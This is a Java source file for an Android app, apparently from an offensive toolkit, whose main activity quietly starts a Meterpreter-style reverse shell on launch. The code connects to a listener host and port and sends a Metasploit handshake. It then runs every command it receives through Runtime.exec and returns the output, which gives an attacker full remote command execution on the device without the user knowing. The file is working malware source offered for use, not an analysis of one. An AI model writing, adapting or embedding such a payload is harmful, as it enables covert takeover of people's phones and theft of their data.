package com.lazyframework.meterpreter;

import android.app.Activity;
import android.os.Bundle;
import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends Activity {
    private static final String LHOST = "127.0.0.1";
    private static final int LPORT = 4444;
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Start meterpreter in background
        executor.submit(new MeterpreterTask());
    }
    
    class MeterpreterTask implements Runnable {
        public void run() {
            try {
                Socket socket = new Socket(LHOST, LPORT);
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
                BufferedWriter writer = new BufferedWriter(
                    new OutputStreamWriter(socket.getOutputStream()));
                
                // Send handshake
                String handshake = "METASPLOIT_STAGED_METERPRETER";
                writer.write(handshake);
                writer.flush();
                
                // Command loop
                String command;
                while ((command = reader.readLine()) != null) {
                    if (command.equals("exit")) break;
                    
                    try {
                        Process process = Runtime.getRuntime().exec(command);
                        BufferedReader processReader = new BufferedReader(
                            new InputStreamReader(process.getInputStream()));
                        
                        StringBuilder output = new StringBuilder();
                        String line;
                        while ((line = processReader.readLine()) != null) {
                            output.append(line).append("\\n");
                        }
                        
                        writer.write(output.toString());
                        writer.flush();
                        
                    } catch (Exception e) {
                        writer.write("Error: " + e.getMessage());
                        writer.flush();
                    }
                }
                
                socket.close();
            } catch (Exception e) {
                // Connection failed, retry later
                try {
                    Thread.sleep(30000); // 30 seconds
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                }
            }
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        executor.shutdown();
    }
}
